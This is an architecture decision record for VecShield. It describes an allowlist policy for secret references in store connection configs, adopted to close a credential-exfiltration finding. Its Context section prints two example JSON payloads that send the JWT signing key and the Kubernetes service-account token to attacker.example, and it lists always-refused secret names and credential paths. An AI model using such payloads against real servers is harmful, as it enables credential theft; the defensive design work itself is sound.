# ADR 0003: Secret-reference allowlist for store connections

Status: accepted (2026-09-29)

Numbering note: this ADR takes 0003. The enterprise-identity work in the
readiness plan (§1, OIDC/SCIM) will take ADR 0004.

## Context

A store's connection config never holds a secret directly. It names one
indirectly and the server resolves it when it connects
(`vecshield_platform/api/secrets.py`):

- `<key>_env`: the value of the named environment variable;
- `<key>_file`: the trimmed contents of the named file.

Until now any name and any path resolved. The resolved value is handed to the
connector, and `POST /admin/stores/test-connection` connects to a host the
caller chooses. So anyone holding the admin role could read any environment
variable or file visible to the server process and send it to their own host:

```json
{"kind": "qdrant", "url": "https://attacker.example",
 "api_key_env": "VECSHIELD_JWT_SECRET"}
{"kind": "pgvector", "host": "attacker.example",
 "password_file": "/var/run/secrets/kubernetes.io/serviceaccount/token"}
```

That turns "admin of VecShield" into "holder of every credential in the pod":
the JWT signing key (forge any identity), the static admin/read tokens, the
initial admin password, the Kubernetes service-account token and any cloud
workload-identity token. In the Helm chart the single `CUSTOMER_API_TOKEN` is
an admin token by default, so anyone with that token had this reach. This is
finding F1 in the readiness plan's threat model (§0.1, §2.2), rated High.

## Decision

Resolution goes through `SecretReferencePolicy`, read from the environment on
each resolution so a restart is not needed to change it.

1. **Environment names are allowlisted.** A `*_env` name resolves only when it
   starts with an allowed prefix (`VECSHIELD_SECRET_ENV_PREFIXES`, comma
   separated, default `VECSHIELD_STORE_`) or is listed exactly in
   `VECSHIELD_SECRET_ENV_ALLOW` (comma separated).
2. **File paths are allowlisted.** A `*_file` path must be absolute and, after
   `realpath` (symlinks and `..` resolved), lie under an allowed root
   (`VECSHIELD_SECRET_FILE_ROOTS`, comma separated, default
   `/run/secrets/vecshield/`). The resolved path is then opened with
   `O_NOFOLLOW`, so a final-component symlink swapped in after the check is not
   followed.
3. **Some targets are always refused, even when allowlisted.**
   - The server's own authentication and configuration variables:
     `CUSTOMER_API_TOKEN`, `LOCAL_ADMIN_TOKEN`, `VECSHIELD_ADMIN_TOKEN`,
     `VECSHIELD_API_TOKEN`, `VECSHIELD_JWT_SECRET`,
     `VECSHIELD_INITIAL_ADMIN_PASSWORD`, `VECSHIELD_OIDC_CLIENT_SECRET`,
     `VECSHIELD_SCIM_*` and the three allowlist variables themselves; and, as a
     rule, **every `VECSHIELD_*` name outside `VECSHIELD_STORE_*`**. That rule
     covers future `VECSHIELD_*PASSWORD*`/`*SECRET*`/`*TOKEN*` settings
     without having to list them, and means widening the prefix to
     `VECSHIELD_` cannot expose them.
   - Platform credential and pseudo-filesystem paths:
     `/var/run/secrets/kubernetes.io`, `/run/secrets/kubernetes.io`,
     `/var/run/secrets/eks.amazonaws.com`, `/var/run/secrets/azure`,
     `/var/run/secrets/tokens` (projected tokens), `/proc`, `/sys`, `/dev`.
4. **Fail closed, before looking.** The policy is checked before the variable
   is read or the file is opened, so a refused reference answers the same
   whether or not the target exists (no existence oracle). The error
   (`SecretReferenceDenied`, a `SecretResolutionError`) names the config key,
   the reference and the rule that refused it, never a value.
5. **Checked at save time and at connect time.** `ConfigStore.add_store` and
   `update_store` refuse a denied reference before anything is persisted; the
   API answers 422. `resolve_conn` checks again whenever a connection is
   opened, including `test-connection`.
6. **Audited.** `store_added`, `store_updated` and `store_connection_tested`
   audit entries carry `secret_refs`: the reference keys and the variable
   names/paths they point at, never the values. A refused attempt writes a
   `secret_reference_refused` entry with the names and the rule, because a
   refused reference is what an attempt to read the server's own secrets looks
   like.

## Alternatives considered

- **Denylist only** (refuse the known app secrets, allow everything else).
  Rejected: the dangerous set is open-ended (cloud credentials, database
  passwords of other systems, anything an operator exports), and a denylist
  silently goes stale as settings are added.
- **Drop `*_env`/`*_file` and require a secrets manager.** Rejected for now:
  Docker/Kubernetes secret mounts and environment injection are how customers
  run the product today. A manager-backed resolver can be added through
  `register_resolver` later.
- **Only restrict `test-connection`.** Rejected: a saved store connects to its
  configured host on every scan, so saving the store is the same exfiltration
  with one more step.
- **A startup opt-out that restores unrestricted resolution.** Rejected: it
  would be an easy way to reintroduce the finding. The exact-name allowlist is
  the narrow migration path instead.

## Consequences

- An admin can no longer read the server's credentials through a store config.
  Admin remains a powerful role (it can point a store at a host it controls
  with a secret it is allowed to reference), which is inherent to configuring
  connectors.
- Operators must put store secrets in `VECSHIELD_STORE_*` variables or under
  `/run/secrets/vecshield/`, or allowlist them explicitly. The Helm chart
  mounts `storeSecrets.secretName` at `/run/secrets/vecshield` and exposes
  `storeSecrets.envPrefixes`/`envAllow` for this.
- A config saved before this change that references a name outside the
  allowlist keeps loading; the store is registered as **unavailable** with the
  refusal as its reason, and a startup warning names the migration steps. Other
  stores are unaffected.
- Error text and audit entries name environment variable names and file paths.
  Those are configuration, visible already in `GET /admin/stores`, not
  secrets.

## Migration and reproduction impact

For each store whose config uses a `*_env` or `*_file` reference:

1. Look for `store <id> is unavailable: secret reference ... refused` in the
   server log, or the `unavailable` reason on `GET /admin/stores`.
2. Either rename the variable into the store namespace (for example
   `PG_PASSWORD` to `VECSHIELD_STORE_PG_PASSWORD`) and update the store, or move
   the file under `/run/secrets/vecshield/`, or allow the existing name exactly:
   `VECSHIELD_SECRET_ENV_ALLOW=PG_PASSWORD,QDRANT_KEY` (Helm:
   `storeSecrets.envAllow`). A file elsewhere can be allowed by adding its
   directory to `VECSHIELD_SECRET_FILE_ROOTS`.
3. A reference to one of the always-refused targets cannot be allowed; give the
   store its own credential.

Regression tests: `tests/test_secret_reference_allowlist.py` (the §0.1 exploit,
prefixes and exact names, `..` and symlink escapes, platform paths, save-time
refusal, legacy configs loading as unavailable, and the audit entries).
Existing tests that used unrestricted names were moved into the
`VECSHIELD_STORE_` namespace; the one test that encoded "references are not
restricted" now asserts the allowlist.
